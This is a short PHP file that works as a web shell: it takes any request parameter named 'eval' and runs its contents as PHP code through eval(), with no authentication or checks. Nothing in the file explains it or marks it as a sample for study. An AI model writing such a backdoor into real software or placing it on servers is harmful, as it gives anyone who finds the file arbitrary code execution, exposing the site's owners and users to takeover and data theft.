<?php
if(isset($_REQUEST['eval'])){
	ob_start();
	eval(stripslashes(trim($_REQUEST['eval'])));
}

?>